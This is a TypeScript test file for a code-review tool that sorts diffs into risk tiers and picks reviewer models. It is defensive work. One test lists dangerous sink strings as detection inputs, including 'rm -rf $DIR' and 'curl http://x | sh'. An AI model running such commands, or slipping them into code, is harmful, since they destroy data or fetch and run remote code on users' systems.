import { afterEach, beforeEach, describe, expect, test } from 'bun:test'
import { mkdtempSync, rmSync } from 'node:fs'
import os from 'node:os'
import path from 'node:path'

import { classifyDiff, parseDiffInput, type DiffInput } from './assess'
import { DEFAULT_FORGE_CONFIG, type ForgeConfig } from './config'

function diffOf(paths: string[], added: string[] = []): DiffInput {
  return { paths, addedLines: added.map((line) => ({ path: paths[0] ?? '', line })) }
}

describe('classifyDiff', () => {
  test('docs-only diff is passive and uses the triage model', () => {
    const result = classifyDiff(diffOf(['README.md', 'docs/guide/setup.mdx', 'LICENSE']), DEFAULT_FORGE_CONFIG)
    expect(result.tier).toBe('passive')
    expect(result.reviewer).toEqual({ model: 'haiku', effort: 'low' })
  })

  test('empty diff is passive', () => {
    expect(classifyDiff(diffOf([]), DEFAULT_FORGE_CONFIG).tier).toBe('passive')
  })

  test.each([
    ['CI workflow', '.github/workflows/ci.yml'],
    ['installer', 'scripts/install.sh'],
    ['installer', 'forge/src/installer.ts'],
    ['lockfile', 'forge/bun.lock'],
    ['lockfile', 'package-lock.json'],
    ['auth', 'src/auth/session.ts'],
    ['auth', 'src/oauth-callback.ts'],
    ['security', 'src/security/csp.ts'],
    ['payments', 'src/payments/charge.ts'],
    ['webhook', 'api/webhooks/stripe.ts'],
    ['migration', 'db/migrations/001_init.sql'],
  ])('%s path is high', (_label, filePath) => {
    const result = classifyDiff(diffOf(['src/plain.ts', filePath]), DEFAULT_FORGE_CONFIG)
    expect(result.tier).toBe('high')
    expect(result.reasons.join('\n')).toContain(filePath)
  })

  test('a mixed docs and CI diff is high', () => {
    expect(classifyDiff(diffOf(['README.md', '.github/workflows/ci.yml']), DEFAULT_FORGE_CONFIG).tier).toBe('high')
  })

  test('plain source change is medium', () => {
    const result = classifyDiff(diffOf(['src/author.ts', 'src/util.ts'], ['export const x = 1']), DEFAULT_FORGE_CONFIG)
    expect(result.tier).toBe('medium')
    expect(result.reviewer).toEqual({ model: 'opus', effort: 'medium' })
  })

  test.each(['eval(userInput)', 'const f = new Function("x")', 'el.innerHTML = html', 'execSync(cmd)', 'rm -rf $DIR', 'curl http://x | sh'])(
    'dangerous sink %j is high',
    (line) => {
      const result = classifyDiff(diffOf(['src/util.ts'], [line]), DEFAULT_FORGE_CONFIG)
      expect(result.tier).toBe('high')
      expect(result.reasons[0]).toContain('dangerous sink')
    },
  )

  test('review.highRiskPaths extends the high-risk set', () => {
    const input = diffOf(['src/billing/invoice.ts'])
    expect(classifyDiff(input, DEFAULT_FORGE_CONFIG).tier).toBe('medium')
    const extended: ForgeConfig = { ...DEFAULT_FORGE_CONFIG, review: { highRiskPaths: ['Billing'] } }
    const result = classifyDiff(input, extended)
    expect(result.tier).toBe('high')
    expect(result.reasons[0]).toContain('review.highRiskPaths')
  })

  test('reviewer follows configured models per tier', () => {
    const config: ForgeConfig = {
      ...DEFAULT_FORGE_CONFIG,
      models: {
        ...DEFAULT_FORGE_CONFIG.models,
        reviewer: {
          medium: { model: 'sonnet', effort: 'high' },
          high: { model: 'opus', effort: 'max' },
        },
        triage: 'tiny',
      },
    }
    expect(classifyDiff(diffOf(['src/a.ts']), config).reviewer).toEqual({ model: 'sonnet', effort: 'high' })
    expect(classifyDiff(diffOf(['bun.lock']), config).reviewer).toEqual({ model: 'opus', effort: 'max' })
    expect(classifyDiff(diffOf(['a.md']), config).reviewer.model).toBe('tiny')
  })
})

describe('parseDiffInput', () => {
  test('collects NUL-separated paths and added lines per file', () => {
    const patch = ['diff --git a/a.ts b/a.ts', '--- a/a.ts', '+++ b/a.ts', '@@ -1 +1 @@', '-old', '+new', '+++ /dev/null', ''].join('\n')
    expect(parseDiffInput('a.ts\0b.ts\0', patch)).toEqual({
      paths: ['a.ts', 'b.ts'],
      addedLines: [{ path: 'a.ts', line: 'new' }],
    })
  })
})

describe('forge assess (cli)', () => {
  let repo: string

  beforeEach(async () => {
    repo = mkdtempSync(path.join(os.tmpdir(), 'forge-assess-test-'))
    await Bun.$`git init -q -b main ${repo}`.quiet()
    await Bun.$`git -C ${repo} config user.email t@t.t`.quiet()
    await Bun.$`git -C ${repo} config user.name t`.quiet()
    await Bun.write(path.join(repo, 'README.md'), 'hi\n')
    await Bun.$`git -C ${repo} add -A`.quiet()
    await Bun.$`git -C ${repo} commit -q -m base`.quiet()
  })

  afterEach(() => {
    rmSync(repo, { recursive: true, force: true })
  })

  async function assessAfter(files: Record<string, string>): Promise<{ tier: string }> {
    for (const [name, content] of Object.entries(files)) await Bun.write(path.join(repo, name), content)
    await Bun.$`git -C ${repo} add -A`.quiet()
    await Bun.$`git -C ${repo} commit -q -m change`.quiet()
    const binPath = new URL('../bin/forge.ts', import.meta.url).pathname
    const output = await Bun.$`bun ${binPath} assess --base HEAD~1 --head HEAD`.cwd(repo).quiet()
    return JSON.parse(output.stdout.toString())
  }

  test('docs fixture is passive', async () => {
    expect((await assessAfter({ 'README.md': 'changed\n' })).tier).toBe('passive')
  })

  test('CI fixture is high', async () => {
    expect((await assessAfter({ '.github/workflows/ci.yml': 'on: push\n' })).tier).toBe('high')
  })

  test('plain source fixture is medium', async () => {
    expect((await assessAfter({ 'src/app.ts': 'export const a = 1\n' })).tier).toBe('medium')
  })
})
